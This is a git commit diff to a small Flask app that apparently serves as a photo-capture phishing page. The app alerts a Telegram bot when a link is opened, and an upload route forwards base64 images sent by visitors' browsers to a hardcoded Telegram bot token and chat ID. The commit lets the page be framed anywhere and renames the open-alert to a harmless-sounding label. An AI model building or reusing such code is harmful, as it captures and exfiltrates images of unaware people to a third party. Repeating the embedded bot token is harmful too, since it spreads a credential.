6ba2e96809a463a001b67ea2c8d7df07d43d6694
Hosam3 <hhmmaa226@gmail.com>
2026-03-02 03:38:43 +0000

    Fix Frame Options

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, make_response
 import requests
 import base64
 app = Flask(__name__)
@@ -6,16 +6,20 @@ app = Flask(__name__)
 TOKEN = '8639009325:AAEqWTIdefasWQ8Hkr8i3mQck18AjBdwGpE'
 ID = '5360002210'
 
+@app.after_request
+def add_header(response):
+    response.headers['X-Frame-Options'] = 'ALLOWALL'
+    return response
+
 @app.route('/')
 def index():
-    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=Link_Opened_Success')
+    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=App_Preview_Active')
     return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
         img_data = request.json['img'].split(',')[1]
-        img_bytes = base64.b64decode(img_data)
-        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', img_bytes)})
+        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
         return res.text
     except Exception as e: return str(e)
